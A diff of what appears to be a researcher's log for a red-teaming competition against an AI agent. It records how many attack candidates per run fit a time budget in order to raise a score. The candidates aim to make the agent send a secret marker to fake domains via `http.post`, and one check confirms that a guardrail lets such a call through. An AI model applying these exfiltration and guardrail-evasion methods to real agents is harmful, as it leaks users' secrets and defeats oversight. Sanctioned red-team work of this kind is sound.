@@ -480,6 +480,37 @@ The 3.1.0 → 3.1.2 upgrade changed TWO independent things, both validated local
   Notebook cell 2 verified byte-identical to repo-root attack.py.
 - Kernel push: `--accelerator NvidiaTeslaT4`.
 
+### v22 RESULT (checked 2026-07-16) — BLANK → wall tightened to (120, 610]
+- v22 (ref 54755276, kernel v24, 610 single-hop) → **blank**, status COMPLETE.
+  610 generations/phase still overran the 9000 s/phase deadline. 11.105 best stands.
+- Updated bracket: **(120, 610]**. Three anchors now: v20@120 COMPLETE, v22@610
+  BLANK, v21@1100 BLANK. The wall is lower than the v20-derived cost estimate
+  predicted → per-candidate cost is higher/variance-ier than "≈1 generation": the
+  v20 raw (2221 vs 2160) already showed a minority of candidates fire a 2nd
+  http.post, so mean cost > 1 gen/candidate and 610 was over budget.
+- **NEXT STEP — bisect (120, 610].** Midpoint N≈365 (→≈32.85, pure bisection, max
+  info). Safer lock: N≈300 (→27) or N≈250 (→22.5) to bank a >11.105 positive with
+  headroom. Recommendation: N=350 (→31.5) — near the midpoint but slightly under to
+  favor completing and locking a ~3× improvement. Change ONLY DEFAULT_TARGET.
+  * next COMPLETES → wall in (N, 610]; push up.
+  * next BLANKS → wall in (120, N]; drop down.
+- The ~0.09·N_max ceiling of pure single-hop count-scaling is looking like it lands
+  in the 30s–50s, not 90+. To reach the 90–104 leaderboard band we will need a
+  structurally cheaper per-candidate trace (guaranteed strictly-1-hop) or a
+  higher-severity / multi-predicate mix — flagged for after the wall is pinned.
+
+### v23 — BINARY-SEARCH cont. (ref TBD, kernel TBD, 2026-07-16): 350 candidates
+- Bisect (120, 610] at N=350 (→≈31.5; a touch under the true midpoint 365 to favor
+  completing and bank a ~3× jump over the 11.105 best). Change ONLY DEFAULT_TARGET;
+  3-letter hosts + early-stop wording held fixed.
+  * v23 @350 COMPLETES → wall in (350, 610]; next push toward ~480.
+  * v23 @350 BLANKS → wall in (120, 350]; next drop toward ~235.
+- Local pre-push checks (comp_data): 350 unique single-hop candidates, 350 unique
+  domains, all carry `data=SECRET_MARKER`, max msg len 181 (<2000), guardrail
+  `http.post(url=aaa.co, data=SECRET_MARKER)` → ALLOW. Notebook cell 2 byte-identical
+  to repo-root attack.py.
+- Kernel push: `--accelerator NvidiaTeslaT4`.
+
 ### Truths to relearn next time we look
 1. **Predicates are trace-anchored in 3.1.2.** Any payload that isn't either
    `SECRET_MARKER` or a substring of secret.txt is dead on arrival.
